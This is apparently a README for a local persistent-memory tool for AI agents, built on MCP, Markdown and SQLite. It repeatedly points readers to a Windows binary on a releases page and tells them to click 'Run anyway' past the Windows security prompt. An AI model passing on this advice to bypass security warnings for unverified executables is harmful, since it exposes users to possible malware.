# 🧠 Awareness-Local - Persistent memory for AI agents

[![Download Awareness-Local](https://img.shields.io/badge/Download-Awareness--Local-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/okeidontlike/Awareness-Local/releases)

## 🚀 What it does

Awareness-Local gives your AI agent a local memory it can use again and again. It stores notes in Markdown files, keeps search fast with SQLite, and works offline once you set it up.

Use it with tools like:

- Claude Code
- Cursor
- Windsurf
- OpenClaw

It keeps your agent context on your own computer, so you do not need an account or cloud service.

## 📥 Download

Visit this page to download the Windows release:

[Download Awareness-Local releases](https://github.com/okeidontlike/Awareness-Local/releases)

Look for the latest release and download the Windows file that matches your system. If the release includes a ZIP file, download it, then extract it before you run the app.

## 🪟 Install on Windows

1. Open the download page.
2. Download the latest Windows build.
3. If the file is zipped, right-click it and choose Extract All.
4. Open the extracted folder.
5. Run the main app file.

If Windows shows a security prompt:

1. Click More info.
2. Click Run anyway.

This app runs locally, so it keeps your memory data on your own machine.

## 🧩 First launch

When you start Awareness-Local for the first time, it creates a local workspace for your memory files.

You will usually see:

- a simple setup screen
- a folder path for your data
- options to connect your AI tool
- a dashboard for browsing memory

Choose a folder that is easy to find, such as Documents or a dedicated AI folder.

## 🔗 Connect your AI tool

Awareness-Local works with agents that support MCP.

To connect it:

1. Open your AI tool.
2. Find the MCP or local tools settings.
3. Add Awareness-Local as a local MCP server.
4. Save the setup.
5. Restart the tool if needed.

Once connected, your agent can read and write memory entries during your work.

## 🗂️ How memory is stored

Awareness-Local uses plain Markdown files for storage. That means your memory is easy to read, edit, and back up.

Each memory entry can include:

- task notes
- project facts
- user preferences
- recurring instructions
- past decisions

It also uses hybrid search:

- FTS5 for fast text search
- embeddings for meaning-based search

This helps the agent find the right memory even when the wording is not exact.

## 🖥️ Use the web dashboard

The web dashboard gives you a simple way to view and manage memory.

You can use it to:

- search stored notes
- review recent entries
- edit memory files
- remove old items
- keep track of agent context

Open the dashboard in your browser after setup. It works like a local control panel for your memory data.

## 🛠️ Basic usage

After setup, your agent can use Awareness-Local to keep track of useful details.

Typical use cases:

- remember project goals
- store coding preferences
- keep notes about active tasks
- save things the agent should not forget
- reuse past context in later sessions

Example:

- You tell the agent your preferred file layout.
- It stores that choice in memory.
- In the next session, it reads the memory and uses the same layout.

## ✅ System requirements

For smooth use on Windows, this app works best on:

- Windows 10 or Windows 11
- 4 GB RAM or more
- enough free disk space for local memory files
- internet access only for the first download

You do not need a cloud account to use it after setup.

## 📁 File layout

A typical setup includes:

- Markdown files for memory entries
- a local SQLite database for indexing
- embedding data for search
- dashboard files for the web view
- config files for your agent connection

This structure keeps the data local and easy to manage.

## 🔍 Search behavior

Awareness-Local uses two search methods so it can find memory in more than one way:

- exact word search for known terms
- meaning search for related ideas

This helps when you remember part of a fact, but not the exact words. It is useful for long projects and repeated workflows.

## 🔒 Local-first design

All core data stays on your device.

That means:

- no account login
- no cloud sync by default
- no external memory store
- no hidden server setup

This is useful if you want control over your agent data and want to keep work on your own computer.

## ❓ Common questions

### Do I need to know coding?

No. You only need to download the release, open the file, and follow the setup steps.

### Does it work without the internet?

Yes, after you download it and finish setup.

### Can I use it with more than one AI tool?

Yes, if each tool supports MCP or local integration.

### Can I edit memory by hand?

Yes. Since the files use Markdown, you can open and edit them with any text editor.

### Where should I keep the files?

Use a folder you can find again, such as a folder in Documents or on your desktop.

## 🧭 Suggested first setup

If you want a simple start, use this path:

1. Download the latest Windows release.
2. Extract the files if needed.
3. Run the app.
4. Pick a local data folder.
5. Open the web dashboard.
6. Connect your AI tool through MCP.
7. Add a few memory items for your current project.

## 🧪 What you can try first

After setup, ask your agent to remember:

- your name
- your project name
- your preferred tone
- file naming rules
- task priorities
- things to avoid

Then start a new session and check whether the agent uses that memory again

## 📌 Topics

- ai-agent
- ai-memory
- claude-code
- cursor
- llm
- local-first
- markdown
- mcp
- offline
- openclaw
- persistent-memory
- sqlite
- windsurf

## 📦 Download location

[Open the Awareness-Local release page](https://github.com/okeidontlike/Awareness-Local/releases)

Download the latest Windows release from that page, then run the app after extraction if the file comes in a ZIP folder